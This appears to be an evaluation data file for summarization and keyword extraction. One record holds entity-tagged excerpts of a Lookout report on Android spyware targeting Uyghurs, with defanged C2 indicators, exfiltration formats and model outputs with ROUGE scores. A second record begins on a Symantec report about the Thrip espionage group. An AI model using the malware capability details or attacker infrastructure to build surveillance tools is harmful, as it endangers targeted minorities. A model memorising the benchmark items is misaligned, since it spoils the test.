seen in the activity of the threat actor behind [ORG] CarbonSteal . This includes application titles , package names and encrypted files \u2019 names . IoC overlap from [DATE] 2018 between [ORG] CarbonSteal , [ORG] HenBox , and an [ORG] IP address tied to [ORG] APT backdoor use in [DATE] 2014.In [DATE] July [DATE] 2019 , ESET published findings on a previously undocumented backdoor named Okrum , used to deliver [NORP] Ketrican [PERSON] malware38 and attributed to the [ORG] Ke3chang group . According to this report , several [NORP] Ketrican samples from [DATE] 2017 communicated to subdomains of babytoy - online[.]com . [NORP] Ketrican SHA-1C2 serverD3BFB10DB08C6828C3001C1F825ED6A6BF6F6E01buy.babytoy - online[.]com2C8B145EF5AC177C99DFCB8C0221E30B3A363A96newflow.babytoy - online[.]comD8AA9E4918E464D00BA95A3E28B8707A148EC4D7buy.babytoy - online[.]comF2BFDA51BDA3EE57878475817AF6E5F24FFBBB28items.babytoy - online[.]com38 url not a concrete connection , this is reminiscent of the naming pattern seen in many past domains associated with [ORG] Henbox , [ORG] SilkBean and [ORG] PluginPhantom infrastructure . Other domains seen associated with [ORG] HenBox , [ORG] SilkBean and [ORG] PluginPhantom , families monitoring [NORP] Chinese minorities . Given the overlaps of C2 infrastructure , it appears plausible that these [CARDINAL] three families have the same developer and targets . This belief , in conjunction with past public reporting39 that [ORG] HenBox is also tied to APT15 , leads Lookout researchers to believe that [ORG] SilkBean , [ORG] PluginPhantom , and now [ORG] CarbonSteal , can be tied to this mAPT threat . GoldenEagleFindingsThe last family in this discussion is [ORG] GoldenEagle , which Lookout researchers also believe is being used by the same group of [GPE] China - based actors described in this report . [ORG] GoldenEagle , so called due to titles ( \u201c Golden.eagle \u201d ) and package names ( \u201c com.golden.eagle \u201d ) of samples believed to be test / development versions , targets primarily [ORG] Uyghurs and [NORP] Muslims in general , as well as [NORP] Tibetans , individuals in [GPE] Turkey , and in [GPE] China . Golden eagles are used as part of ancient hunting traditions40 throughout the Eurasian Steppe and diasporas in Mongolia and [LOC] the [LOC] Xinjiang [LOC] Autonomous [LOC] Region whose population is primarily [PERSON] Uyghur . Among the aspects that make [ORG] GoldenEagle particularly interesting is that the earliest test samples of this family appeared [DATE] as [DATE] early [DATE] as [DATE] 2012 , making it one of the longest- running surveillanceware families we have observed to date . [ORG] GoldenEagle code has been identified in an impressively39 url versary - playbook - long - standing - espionage - activity - chinese - nation - state - adversary/40 url and diverse set of applications over [DATE] the [DATE] years . These samples can be divided into [CARDINAL] two major groups : those that exfiltrate data via HTTP and those that exfiltrate data via SMTP , i.e. , by sending exfiltrated data in file attachments of emails to an attacker - controlled mailbox using innocuous - looking subjects and mail body content . The latter technique , while appearing in the early stages of [ORG] GoldenEagle development , has resurfaced in samples signed and analysed in [DATE] May [DATE] 2020.Insecure configurations in attacker infrastructure have also shown that the actor behind [ORG] GoldenEagle is not only targeting [ORG] Android devices , but also conducting phishing attacks in parallel from the same administration console . The actors behind [ORG] GoldenEagle have shown themselves to be well resourced and capable of operating a long - running campaign . Mapping out when apps trojanized with [ORG] GoldenEagle were signed shows the actors \u2019 activity . A clear spike in samples belonging to this familytook place during [DATE] 2016 , and new samples have continued to be observed in [DATE] 2020 . At this point it is unclear whether these new samples arepart of testing or a re - emergence of [ORG] GoldenEagle activity , as these newer samples appear to be largely unchanged and possess the test title\u201cGolden.eagle\u201d.30The majority of samples of [ORG] GoldenEagle were clearly developed with targeting of the [LOC] Uyghur minority in mind and included trojanized versions of apps such as [GPE] Sarkuy ( [PERSON] Uyghur music service ) , Tawarim ( Uyghur e - commerce site ) , uyhurqa kirgvzvx ( [PERSON] Uyghur input keyboard ) , [ORG] Yeltapan [ORG] Air ( possibly an airline booking application [ORG] - [ORG] Yeltapan [ORG] Inc. is a popular [LOC] Uyghur app development company ) , [ORG] TIBBIYJAWHAR ( [ORG] Uyghur [ORG] Pharmaceutical app ) , [ORG] Hawar.cn [ORG] News ( believed to previously provide [PERSON] Uyghur - specific news and content ) , [ORG] Nur.cn [ORG] News ( also delivers [ORG] Uyghur - specific content ) and [LOC] the [LOC] Uyghur [LOC] Quran , among others . Other samples included trojanized apps with a broad range of functionality from VPNs , instant messaging , and socialnetworking to games , adult media content , and Google searching . Notable trojanized apps include Twitter , Facebook , [LAW] Calendar , [GPE] AIM , [GPE] RenRen , [ORG] VLC media player , and the QQ messaging application . The expanse of applications trojanized by [ORG] GoldenEagle alsoindicated additional targets , with applications titled \u201c \u201d [WORK_OF_ART] ( Quick [WORK_OF_ART] Search [WORK_OF_ART] Tibet ) , \u201c \u201d ( [WORK_OF_ART] Travel [WORK_OF_ART] Notes in [GPE] Tibet ) and \u201c \u201d ( Beautiful Tibet Featured Wallpaper ) thatappeared to focus on individuals living or travelling in [GPE] Tibet . \u201c [WORK_OF_ART] Gundem [WORK_OF_ART] News \u201d was also seen in the array of titles suggestingindividuals in [GPE] Turkey are also targeted . \u201c [DATE] 8684 \u201d , the [GPE] Beijingbus transit application , was also seen as an app title , possibly indicating broader [NORP] Chinese targeting . The actors behind [ORG] GoldenEagle have deployed trojanized versions of a staggeringly large and diverse set of applications . This level of technicalinvestment combined with the longevity of operations suggests that [ORG] GoldenEagle is being managed by a well - resourced adversary . Shownabove is a subset of app icons from the [PRODUCT] GoldenEagle family.31Malware detailsGoldenEagle samples can be divided into [CARDINAL] two disparate groups ; samples that communicate to attackers through HTTP requests and samples that communicate via SMTP to a hardcoded email address that is assumed to be operated by the attacker . Early samples of [ORG] GoldenEagle exfiltrated data through files sent over SMTP to an attacker - controlled email address . All samples had the same hardcoded attacker email - . On start up these samples also sent an SMS message to an attacker - controlled number(18801206738 , a [GPE] Beijing mobile number ) with the message \u201c A host online , attention please!\u201d . Use of this version appears to have ended in [DATE] 2017 and has only recently picked up again in [DATE] May [DATE] 2020 with samples labelled with the default name \u201c Golden.eagle \u201d . The email address and phone number remains consistent . This makes it unclear whether this is testing by the actor or another wave of activity . Data exfiltrated by these samples is limited to lightweight text files and includes the following content : Data typeFile attachment 00Subject / body of emailContent of text fileCall LogsC.txtSubject : Hello , [PERSON] George [PERSON] Body : Forum Nokia DeveloperSMSSX.txtSubject : HELOS Body : MyBody < missed calls list > ! -*RMC*- ! < Incoming calls list > ! -*RIC*- ! < Outgoing calls [NORP] list><Inbox list > < Sentbox list > ContactsP.txtSubject : Hi , [PERSON] Peter [PERSON] Body : [PERSON] Launches N900 [PERSON] - Newest mobile < contact list > Early versions of [ORG] Golden [ORG] Eagle exfiltrate data as an attachment to an email with subject , body , and attachment file name specific to the type of data beingexfiltrated . Incomplete functionality for MMS message exfiltration as well as receiving emails from the attacker for command and control operations wasalso seen in later samples . The following credentials were used in all samples of the SMTP version of [ORG] GoldenEagle : Smtp = \u201c smtp.sina.cn\u201dUser = \u201c [PERSON] Password = [ redacted]From = \u201c \u201d \u201d The [ORDINAL] second version of [ORG] GoldenEagle vastly expands the malware \u2019s capability and makes use of [ORG] HTTP [ORG] POST requests as its primary communication method with C2 infrastructure . These samples contain plaintext configuration files stored in the assets directory of each application from where [CARDINAL] C2 information can be gathered.32There are [CARDINAL] two versions of these configuration files that accompany slightly different functionality as well . The earlier version is labelled \u201c goledn_config.json \u201d that has [CARDINAL] only [CARDINAL] one configuration setting beyond attacker C2 details , which registers if the malware has been run for the [ORDINAL] first time or not . In samples making use of the [ORDINAL] second , more advanced version of the configuration file ( named \u201c ygoledn_config.json \u201d ) the configuration contains up to [CARDINAL] 15 different parameters and the malware includes functionality to update these parameters through [CARDINAL] C2 instructions , allowing an attacker to enable and disable various malicious functionality . These more recent [ORG] GoldenEagle samples come with the surveillanceware capabilities listed below.\u2022 Get contact information.\u2022 Retrieve installed apps.\u2022 Retrieve call history.\u2022 [GPE] Notify operator if it has root permissions.\u2022 Retrieve any doc , txt , gif , apk , jpg , png , mp3 , and db filesthat are found on external storage.\u2022 Retrieve text messages.\u2022 Take screenshots.\u2022 Take photos with the device camera.\u2022 Request device administrator privileges.\u2022 Allow proxy configuration.\u2022 Record calls in .amr format.\u2022 Record environment audio when instructed by theoperator.\u2022 Location [CARDINAL] tracking.\u2022 Get messages from chat applications such as WeChat.\u2022 Send notifications to specific SMS endpoints.\u2022 Update themselves.41 url messages are sent by [ORG] GoldenEagle when a [ORDINAL] second stage is successfully installed , or when a SMS message containing a [ORG] Telegram code is received . [ORG] GoldenEagle and [ORG] CarbonSteal convergenceLookout researchers discovered several code overlaps between [ORG] CarbonSteal and [ORG] GoldenEagle , suggesting that the malware families are developed by the same actor . During our investigation , we noticed a unique WeChat ID ( wx09fa07f77f651c23 ) in several [ORG] CarbonSteal samples that was also found in [CARDINAL] one [ORG] GoldenEagle sample . This ID is also used in an application ( SHA-1 : signed using the same signing certificate also used to sign known [PRODUCT] CarbonSteal samples . However , this particular sample appears to be an app dropper rather than a full - featured surveillanceware though it is also capable of tracking device location . The title and legitimate functionality of the app is called \u201c izda \u201d and it connects to a [ORG] Uyghur content site of the same [GPE] name41 . Lookout researchers were not able to retrieve a malicious [ORDINAL] second stage from the app . Code functionality not directly tied to malicious activity within the above - mentioned app dropper application was found to overlap with a number of other [PRODUCT] GoldenEagle samples all targeting [LOC] Uyghur and [NORP] Uzbek speaking individuals or groups . Their titles included , izda ( [PERSON] Uyghur content site ) , [PERSON] Papap ( a [NORP] Chinese language vehicle information app associated with Autonavi ) , Baykuq ( a [LOC] Uyghur language news app ) , [PRODUCT] Misranim ( a popular [LOC] Uyghur language website ) , [ORG] TIBBIYJAWHAR ( [ORG] Uyghur [ORG] Pharmaceutical app ) , and Isimlar ( an [NORP] Uzbek child naming site , with a package name of com.yeltapan.isimlar).33Application icons of malware samples that share overlapping code found in [ORG] CarbonSteal and [ORG] GoldenEagle . All these titles are in line with past [ORG] GoldenEagle and [ORG] CarbonSteal targeting efforts , indicating that the [CARDINAL] two malware families have significant overlap in use . These new samples , in particular those with app dropper functionality may suggest the further evolution of this tooling and the continued activity of the actor behind these threats . C2 infrastructure and connections with other malwareDuring this investigation we mapped out a sprawling infrastructure used by the actor behind [ORG] GoldenEagle which resulted in [CARDINAL] over [CARDINAL] 50 domains and [ORG] IP addresses being tied to this adversary . There was a consistent pattern of registeringand using fake domains intended to fool users into believing that the domain names were associated with popular services such as [ORG] Google , [ORG] Norton , [ORG] Symantec , and [GPE] Voxer . At the time of writing this report , all known C2 infrastructure supporting [ORG] GoldenEagle is no longer active . However , during the investigation in [DATE] 2017 [DATE] - [DATE] 2018 we identified several domains which were found to contain security flaws , allowing for a deeper insight into adversary behavior , targeting and attribution . Among the content accessible was a management panel that contained email addresses of targets , what we believe to be GPS coordinates of target devices , IPs of admin logins and target devices , and evidence that phishing campaigns were being run from the same infrastructure . During the investigation in [DATE] 2017 and 2018 , Lookout researchers were able to retrieve the [ORG] IP addresses for logins to the administrator panel sincemid [DATE] August [DATE] of [DATE] 2017 . This included [CARDINAL] over [CARDINAL] 100 addresses.34Target upload logs as seen on an open [ORG] GoldenEagle administration panel showing some of the earliest uploads from infected devices in 2017.The logs shown in this figure are most likely test devices . Mapping out GPS coordinates listed in the management panel shows a close clustering centering around Tang chang\u2019an Wall Site Park . [CARDINAL] One ofthese is located in an area labelled [ORG] Xi\u2019an [ORG] Tianhe [ORG] Defense [ORG] Technology , which is a large defense contractor in China.35Screenshot showing one of the open [ORG] GoldenEagle management panels where attacker - specified phishing links for [GPE] Voxer , Facebook , VK , andKik are listed . The translated table column titles from left to right are : \u201c Number \u201d , \u201c Type \u201d , \u201c [WORK_OF_ART] Phishing URL \u201d , \u201c Date \u201d , \u201c Action \u201d . The button in the top left is labelled \u201c [WORK_OF_ART] Add [WORK_OF_ART] Phishing URL \u201d . ace.v0xer[.]net was seen live as late as [DATE] August [DATE] 2018 and resolved to an [ORG] IP address to which a [PRODUCT] GoldenEagle [PRODUCT] C2 server ( www.vipapkdownload[.]com ) also resolved until [DATE] September [DATE] 2019 , suggesting [ORG] GoldenEagle was used in multi [DATE] - [DATE] year campaigns and mayhave leveraged phishing attacks at the same time . A small number of [ORG] GoldenEagle samples were also found to communicate to a [CARDINAL] C2 server known to be associated with DoubleAgent activity and tied to [NORP] SilkBean infrastructure mentioned previously in this report ( babyedu - online [ . ] com ) . Titles of these applications appear in [LANGUAGE] English , [GPE] Uyghur , [LANGUAGE] Chinese , [NORP] Arabic and [NORP] Uzbek . [CARDINAL] One title \u201c Abdulweli [PERSON] Qari \u201d may refer to the prominent [NORP] Uyghur [NORP] Muslim cleric [PERSON] Abdukerim [PERSON] Abduweli , also known as , [PERSON] Kerem [PERSON] Qari , who was imprisoned in northwest Xinjiang42.This follows the consistent pattern we have observed in IoCs within the [CARDINAL] four malware families discussed here of leveraging the names of prominent figures in the [LOC] Uyghur community as email addresses in [ORG] WHOIS information , and titles and content of malware samples , intended to entice individuals who are engaging in these topics . A handful of [ORG] GoldenEagle samples also share a C2 IP address ( 203.124.14[.]109 ) with known samples of [GPE] Spywaller43 and titles of those samples were [PERSON] Uyghur targeted , yet another addition to the actor \u2019s Android surveillance arsenal.42 url url Lookout Lookout is the leader in mobile security , protecting the device at the intersection of the personal you and the professional you . Our mission is to secure and empower our digital future in a privacy - focused world where mobile devices are essential to all we do for work and play . The broad adoption of smartphones and tablets have created new and endless ways for cybercriminals to convince you to willingly use your mobile device for their unlawful gain . The most common start of a cyberattack is a phishing link and mobile devices have enabled new ways to send them to you . Phishing risks no longer simply hide in email , but in messaging , social media , and even dating apps . Because we use these devices for both , protecting against phishing is critical for our personal and professional lives . Lookout enables consumers and employees to protect their data , and to securely stay connected without violating their privacy and trust . Our platform uses artificial intelligence to analyze data from [CARDINAL] nearly [CARDINAL] 200 [CARDINAL] million devices and [CARDINAL] over [CARDINAL] 100 [CARDINAL] million apps to protect you from the full spectrum of mobile risk . As a result , Lookout delivers modern endpoint security with the most comprehensive protection from device , network , app and phishing threats without prying into your data . To learn more , visit lookout.com . Acknowledgements This report encompasses [DATE] years of research carried out by a number of researchers over [DATE] the [DATE] years . We would like to thank all the current and former security engineers at Lookout that have contributed to this research . A special thanks to [PERSON] Katie [PERSON] Kleemola , [PERSON] Michael [PERSON] Flossman and [PERSON] Andrew [PERSON] Blaich for their pivotal contributions to this work . Contributors Apurva Kumar , Staff Security Intelligence Engineer , [PERSON] LookoutKristin [PERSON] Del [PERSON] Rosso , Senior Security Intelligence Engineer , [PERSON] LookoutJustin [PERSON] Albrecht , Security Intelligence Engineer , [ORG] LookoutChristoph [ORG] Hebeisen , Head of Research , LookoutContact informationthreat - advisory - service@lookout.com37Appendix A : Targeted countriesWhile studying the malware in this report , evidence suggests the targeting of [CARDINAL] fourteen different countries based on language - specific app titles , in - app content and domain names . [CARDINAL] Twelve out of the [CARDINAL] fourteen countries are on the [NORP] Chinese government \u2019s \u201c [CARDINAL] 26 Sensitive Countries \u201d list , as foundin [ORG] the [ORG] Human [ORG] Rights [ORG] Watch report on \u201c [WORK_OF_ART] Eradicating [WORK_OF_ART] Ideological Viruses : [GPE] China \u2019s Campaign of Repression Against Xinjiang \u2019s Muslims\u201d44 . This compounds our understanding that this long- running toolset is a nation state actor at work and their target is the [LOC] Uyghur population . CountryAfghanistanChinaEgyptFranceIndonesiaIranKazakhstanKuwaitMalaysiaPakistanOn the [ORG] ChineseTargeted by thegovernment\u2019sSurveillancewarelist of sensitivediscussed in thiscountriesreportEvidence of targetig \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 [GPE] Titles and in - app content in [GPE] Pashto \u0649\u0633\u0627\u0626\u06c7\u062f \u06d5\u0631\u0627\u062e\u0649\u062a\u0633\u0649\u0626 E.g. \u201c \u201d [NORP] Chinese titles for all malware in this reportE.g . \u201c \u201d , \u201c \u201d Domain name egyptedu - online[.]comDomain name francedu - online[.]comTitles and in - app content in [NORP] Indonesian E.g. \u201c [WORK_OF_ART] Marbel [WORK_OF_ART] Doa [PERSON] Islam \u201d \u201c Tafsir 1001 Mimpi\u201dTitles and in - app content in [ORG] PersianTitles and in - app content for [GPE] Kazakhstan E.g. \u201c [PERSON] Kazgu\u201d45Titles and in - app content focusing on [ORG] Kuwaiti services E.g. \u201c A2Z [GPE] Kuwait FM Radio\u201dTitles and in - app content in [ORG] Malay [ORG] E.g. \u201c [WORK_OF_ART] Fiqih [WORK_OF_ART] Islam [WORK_OF_ART] Lengkap \u201d \u201c [WORK_OF_ART] Doa [WORK_OF_ART] Harian Islam \u201d \u201c [PERSON] Kumpulan [PERSON] Doa [PERSON] - Doa\u201dTitles and content in [ORG] Pashto [ORG] and/or [ORG] Urdu [ORG] E.g. \u201cShadi [PERSON] Ki [PERSON] Pehli Raat\u201d44 url url ArabiaSyriaTurkeyUzbekistan \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 \u2714 Domain name arabiaedu - online[.]comTitles and in - app content focusing on [GPE] Syria E.g. \u201c [GPE] Syria News\u201dTitles , domain names , and in - app content focusing on [GPE] Turkey E.g. Domains : turknews - online[.]com turkyedu - online[.]com Titles : \u201c [PERSON] T\u00fcrk [PERSON] Tarihindeki imparatorluklar \u201d \u201c [WORK_OF_ART] Turkey [WORK_OF_ART] Navigation \u201d \u201c [PERSON] Al [PERSON] Quran [PERSON] Turkish \u201d etc . Titles , and in - app content in [GPE] Uzbek E.g. \u201c [PERSON] Qum basqan sheher \u201d \u201c [WORK_OF_ART] Uyghurum radiosi\u201d39Appendix B : Indicators of compromiseSilkBeanCommand and control infrastructurewww.turkyedu - online[.]com www.englishedu - online[.]com tree.ddns[.]us coco.wikaba[.]com umare.zyns[.]com phpyahoo.mrbasic[.]com androidapps.spdns[.]eu androidapps.fvk[.]cc androidapps.linkpc[.]net androidapps.duia[.]inheartsys.dnsapi[.]info androidapps.nsupdate[.]info android.apps.us[.]to androidapps.spdns[.]org androidapps.npff[.]co androidapps.home.hn[.]org androidapps.nerdpol[.]ovh androidapps.myfirewall[.]org androidapps.jetos[.]comandroidsapps[.]ml androidapps.tempors[.]com wephone[.]top www.turknews - online[.]com www.cookedu - online[.]com 176.31.115[.]156 joke.upupdate[.]cn:6006 sz.secpert[.]com:8080 103.66.217[.]15:8443 103.75.3[.]59:8443 6006.upupdate[.]cn:8443 ss903.w3.ezua[.]com:8443 ss904.w3.ezua[.]com:8443 119.36.193[.]210:8888 58.49.109[.]166:8011SHA-1 hashes58.49.109[.]166:8012 59.188.236[.]193:8012 59.188.85[.]70:8089 61.134.50[.]45:801 [CARDINAL] 61.134.50[.]45:8011 103.66.217[.]15:8008 [CARDINAL] 103.85.21[.]175:8088 6006.secpert[.]com:8008 s101.secpert[.]com:8088 [DATE] 111.172.155[.]190:60066s2.upupdate[.]cn:8088 [DATE] 113.57.68[.]223:15005 amote-366.vicp[.]cc:15005 103.105.59[.]47:8081 110.153.177[.]126:1882 103.74.193[.]122:8081 183.94.24[.]18:15005 203.124.14[.]109:8080 113.200.218[.]226:8086 103.255.177[.]45:8086 150.107.3[.]188 118.193.232[.]169:8086 185.170.210[.]98:8086SHA-1 hashes103.59.166[.]106:8086 www.vipapkdownload[.]com 103.255.177[.]60:8086 www.nortonservice[.]net:4430 [DATE] 106.12.39[.]148:8086 [DATE] 100.64.223[.]251:8888 10.194.103[.]47:8086vipappdownload[.]com 103.56.17[.]108 101.78.230[.]99 103.255.177[.]61:8086", "generated_text": "research; Lookout; four Android surveillanceware tools; the Uyghur ethnic minority group; Chinese; 2015; SilkBean; DoubleAgent; CarbonSteal; documents; attachments; signatures; connections; other malware families; tools; HenBox; Spywaller; DarthPusher; C2; infrastructure; links; other malware families; CloudFlare; Skype; iCloud; the malware; Chinese; national security directives; counterterrorism; the campaigns; documents; military; government; targets; a variety; languages; Arabic; Russian; Chinese; Tibetan; Muslim; Xinjiang; indicators; compromise; the campaign; a broader strategic goal; people; technology.", "ref_text": "<START-1>The PDF report details mobile surveillance campaigns targeting Uyghurs using Android malware tools. It was written by security researchers at Lookout in June 2020. The report focuses on four interconnected Android surveillanceware tools - SilkBean, DoubleAgent, CarbonSteal, and GoldenEagle - which have been used in long-running campaigns against Uyghurs since at least 2013. SilkBean is a small but sophisticated remote access trojan (RAT) used to target Uyghurs. It has been active since at least 2015. SilkBean shares infrastructure links with other malware like DarthPusher, HenBox, and PluginPhantom, suggesting the same group is behind these tools. DoubleAgent is an advanced Android RAT used against groups with contentious relationships with China, like Tibetans. It has spying capabilities and first appeared in 2013. New DoubleAgent samples from 2019 show continued development and targeting of Uyghurs. CarbonSteal is Android spyware tracked since 2017, focused on audio surveillance. It has infrastructure links to HenBox malware and shares certificates with DoubleAgent, DarthPusher, and other tools, again pointing to the same coordinated group. GoldenEagle is Android spyware potentially dating back to 2012. It impersonates a wide array of apps and has sophisticated data exfiltration capabilities. Links have been found between GoldenEagle, CarbonSteal, and other tools. In total, the report details a long-running, sophisticated mobile spying campaign primarily targeting the Uyghur community globally. The shared infrastructure and code links between the four malware families indicate the same Chinese state-sponsored advanced persistent threat actor is coordinating these efforts. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.42643923240938175, "gpt3/lexical/rouge_rouge2": 0.1284796573875803, "gpt3/lexical/rouge_rougeL": 0.2046908315565032, "gpt3/lexical/rouge_rougeLsum": 0.2046908315565032, "gpt3_generated_text": ["This article discusses a research report by Lookout, a security research company, which reveals the existence of four Android surveillanceware tools that specifically target the Uyghur ethnic minority group in China. The report identifies these tools as SilkBean, DoubleAgent, CarbonSteal, and GoldenEagle, and suggests that they are part of larger mobile advanced persistent threat (mAPT) campaigns that have been active since at least 2013. The article highlights the connections between these malware tools and the actors behind them, including their command and control infrastructure and distribution mechanisms. It also notes that the mAPT activity is associated with desktop APT activity in China, and that the tools have been used to target Uyghurs living outside of China, Tibetans, and Muslim populations worldwide. The report indicates that the development of these malware families aligns with Chinese national security directives and counterterrorism efforts, suggesting a broader strategic goal behind the campaign. The article further reveals that the targets of the mAPT campaigns speak a variety of languages, including Arabic, Russian, Chinese, and Tibetan, among others. It also states that the malware campaigns have targeted at least 14 of the 26 countries listed as \"Sensitive Countries\" by the Chinese government. The article concludes by emphasizing that users of Lookout mobile security products are protected from these threats, and that none of the malicious apps discussed in the report were available on Google Play."]}, {"split_name": "val", "sample_id": "val_42", "prompt_text": "Extract the keywords: BlogsMenu\uf002Save web pages as [ORG] PDF with PDFmyURLPO STED : MI NR EADTHR EAT I [ORG] NTEL [ORG] L [ORG] I [ORG] G ENCE\uf0e0 SUBSCRIBEFOLLOW\uf099 \uf09a \uf08cResponse AttackInvestigationSecurityTeam\uf099\uf08c\uf09aE SOne of the most significant developments in cyber espionage in [DATE] recent [DATE] years has been the number of groups adopting \u201c living off the land \u201d tactics . That \u2019s our shorthand for the use of operating system features or legitimate network administration tools to compromise victims \u2019 networks . The purpose of living off the land is twofold . By using such features and tools , attackers are hoping to blend in on the victim \u2019s network and hide their activity in a sea of legitimate processes . [ORDINAL] Secondly , even if malicious activity involving these tools is detected , it can make it harder to attribute attacks . If everyone is using similar tools , it \u2019s more difficult to distinguish [CARDINAL] one group from another . Most attack groups do still create and leverage custom malware , but it tends to be employed sparingly , reducing the risk of discovery . Save web pages as [ORG] PDF with PDFmyURLFinding the needle in the haystackThis does n\u2019t mean espionage attacks are now going undiscovered , but it does mean that they can take longer for analysts to investigate . This is one of the reasons why [NORP] Symantec created Targeted Attack Analytics ( TAA ) , which takes tools and capabilities that we \u2019ve developed for our own analysts and makes them available to our [ORG] Advanced [ORG] Threat [ORG] Protection ( [ORG] ATP ) customers . TAA leverages advanced artificial intelligence and machine learning that combs through [ORG] Symantec \u2019s data lake of telemetry in order to spot patterns associated with targeted attacks . Its advanced [ORG] AI automates what previously would have taken [TIME] thousands [TIME] of [TIME] hours of analyst time . This makes it far easier for us , and for our customers , to find that needle in the haystack . It was TAA that led us to the latest cyber espionage campaign we \u2019ve uncovered . Back in [DATE] January [DATE] 2018 , TAA triggered an alert at a large telecoms operator in [LOC] Southeast [LOC] Asia . An attacker was using [ORG] PsExec to move laterally between computers on the company \u2019s network . [ORG] PsExec is a [ORG] Microsoft [ORG] Sysinternals tool for executing processes on other systems and is one of the most frequently seen legitimate pieces of software used by attackers attempting to live off the land . However , it \u2019s also widely used for legitimate purposes , meaning malicious use of [ORG] PsExec can be difficult to spot . TAA not only flagged this malicious use of [ORG] PsExec , it also told us what the attackers wereSave web pages as [ORG] PDF with PDFmyURLusing it for . They were attempting to remotely install a previously unknown piece of malware on computers within the victim \u2019s network . When we analyzed the malware , we discovered that it was an updated version of [GPE] Trojan . [ORG] Rikamanu , malware associated with [ORG] Thrip , a group we \u2019ve been monitoring since [DATE] 2013 . After further investigation , we discovered that [ORG] Thrip also used a completely new piece of malware in this attack ( [ORG] Infostealer . Catchamas).Figure [CARDINAL] 1 . Targeted [ORG] Attack [ORG] Analytics leverages machine learning to spot malicious activity associated with targeted attacks and alerts the customer . Armed with this information about the malware and living off the land tactics being used against this victim , we broadened our search to see if we could find similar patterns that indicated [ORG] Thrip had been targeting other organizations . We uncovered a wide - ranging cyber espionage campaign involving powerful malware being used against targets that are aSave web pages as [ORG] PDF with [ORG] PDFmyURLcause for concern . We identified [CARDINAL] three computers in [GPE] China being used to launch the [ORG] Thrip attacks . [ORG] Thrip \u2019s motive is likely espionage and its targets include those in the communications , geospatial imaging , and defense sectors , both in [GPE] the [GPE] United [GPE] States and [LOC] Southeast [LOC] Asia . Eye on the sky : [ORG] Thrip \u2019s targetsPerhaps the most worrying discovery we made was that [ORG] Thrip had targeted a satellite communications operator . The attack group seemed to be particularly interested in the operational side of the company , looking for and infecting computers running software that monitors and controls satellites . This suggests to us that [ORG] Thrip \u2019s motives go beyond spying and may also include disruption . Another target was an organization involved in geospatial imaging and mapping . Again , [ORG] Thrip seemed to be mainly interested in the operational side of the company . It targeted computers running [ORG] MapXtreme GIS ( [ORG] Geographic [ORG] Information [ORG] System ) software which is used for tasks such as developing custom geospatial applications or integrating location- based data into other applications . It also targeted machines running Google Earth Server and [ORG] Garmin imaging software . The satellite operator was n\u2019t the only communications target [ORG] Thrip was interested in . TheSave web pages as [ORG] PDF with [ORG] PDFmyURLgroup had also targeted [CARDINAL] three different telecoms operators , all based in [LOC] Southeast [LOC] Asia . In all cases , based on the nature of the computers infected by [ORG] Thrip , it appeared that the telecoms companies themselves and not their customers were the targets of these attacks . In addition , there was a [ORDINAL] fourth target of interest , a defense contractor . Save web pages as [ORG] PDF with PDFmyURLFigure [CARDINAL] 2 . [ORG] Thrip , spying on communications , mapping , and defense targetsAttempting to hide in plain sightWe\u2019ve been monitoring [ORG] Thrip since [DATE] 2013 when we uncovered a spying campaign being orchestrated from systems based in [GPE] China . Since our initial discovery , the group has changed its tactics and broadened the range of tools it used . Initially , it relied heavily on custom malware , but in this most recent wave of attacks , which began in [DATE] 2017 , the group has switched to a mixture of custom malware and living off the land tools . The latter include : Save web pages as [ORG] PDF with PDFmyURLPsExec : [ORG] Microsoft [ORG] Sysinternals tool for executing processes on other systems . The tool was primarily used by the attackers to move laterally on the victim \u2019s network . [ORG] PowerShell : [ORG] Microsoft scripting tool that was used to run commands to download payloads , traverse compromised networks , and carry out reconnaissance . Mimikatz : Freely available tool capable of changing privileges , exporting security certificates , and recovering Windows passwords in plaintext . WinSCP : Open source [ORG] FTP client used to exfiltrate data from targeted organizations . LogMeIn : Cloud - based remote access software . It \u2019s unclear whether the attackers gained unauthorized access to the victim \u2019s [PRODUCT] LogMeIn accounts or whether they created their own . All of these tools , with the exception of [PERSON] Mimikatz ( which is almost always used maliciously ) , have legitimate uses . For example , [ORG] PowerShell is widely used within enterprises and the vast majority of scripts are legitimate . Similarly , [ORG] PsExec is frequently used by systems administrators . However , in this case , it was [ORG] Thrip \u2019s use of [ORG] PsExec that drew our attention . Through advanced artificial intelligence and machine learning , TAA has trained itself to spot patterns of malicious activity . While [ORG] PsExec itself may be innocuous , the way that it was being used here triggered an alert by TAA . In short , [ORG] Thrip \u2019s attempts at camouflage blew its cover . While [ORG] Thrip now makes heavy use of living off the land tactics , it also employs customSave web pages as [ORG] PDF with [ORG] PDFmyURLmalware , particularly against computers of interest . This includes : [GPE] Trojan . [PERSON] Rikamanu : A custom [GPE] Trojan designed to steal information from an infected computer , including credentials and system information . [ORG] Infostealer . Catchamas : Based on [ORG] Rikamanu , this malware contains additional features designed to avoid detection . It also includes a number of new capabilities , such as the ability to capture information from newer applications ( such as new or updated web browsers ) that have emerged since the original [GPE] Trojan . [ORG] Rikamanu malware was created . Trojan . Mycicil : A keylogger known to be created by underground [NORP] Chinese hackers . Although publicly available , it is not frequently seen . Backdoor . Spedear : Although not seen in this recent wave of attacks , [PERSON] Spedear is a backdoor [GPE] Trojan that has been used by [ORG] Thrip in other campaigns . [GPE] Trojan . [PERSON] Syndicasec : Another [GPE] Trojan used by [ORG] Thrip in previous campaigns . Highly targeted espionage operationFrom the initial alert triggered by TAA , we were able to follow a trail that eventually enabled us to see the bigger picture of a cyber espionage campaign originating from computers within [GPE] China and targeting multiple organizations in the [GPE] U.S. and [LOC] Southeast [LOC] Asia . Espionage is the group \u2019s likely motive but given its interest in compromising operational systems , it could also adopt a more aggressive , disruptive stance should it choose to do so . Save web pages as [ORG] PDF with [ORG] PDFmyURLProtectionSymantec has had protection from [ORG] Thrip since [DATE] 2013 and we secure our customers from the attack group \u2019s latest set of malicious tools . The following protections are in place to protect customers against [ORG] Thrip attacks : File - based protectionTrojan . [PERSON] Rikamanu [PERSON] Trojan . [ORG] SyndicasecNetwork [ORG] Protection [ORG] ProductsMalware [ORG] Analysis [ORG] Appliance detects activity associated with [ORG] Thrip [ORG] Customers with Webpulse - enabled products are protected against activity associated with [ORG] ThripThreat [ORG] IntelligenceSave web pages as 